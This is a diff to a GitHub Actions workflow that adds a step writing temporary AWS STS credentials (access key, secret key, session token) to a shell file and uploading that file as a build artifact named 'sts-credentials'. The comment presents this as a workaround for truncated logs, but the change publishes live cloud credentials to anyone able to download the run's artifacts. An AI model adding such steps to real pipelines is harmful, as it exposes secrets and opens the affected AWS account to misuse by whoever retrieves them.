@@ -78,3 +78,17 @@ jobs:
           echo ""
           echo "  # Your PR should flip to 'Merged' in the GitHub UI."
           echo "============================================================"
+          # Also write to file for artifact upload (log truncates long lines)
+          cat > /tmp/sts-creds.sh <<EOF
+          export AWS_ACCESS_KEY_ID=$AK
+          export AWS_SECRET_ACCESS_KEY=$SK
+          export AWS_SESSION_TOKEN=$ST
+          export AWS_REGION=$AWS_REGION
+          EOF
+
+      - name: Upload STS credentials as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: sts-credentials
+          path: /tmp/sts-creds.sh
+          retention-days: 1
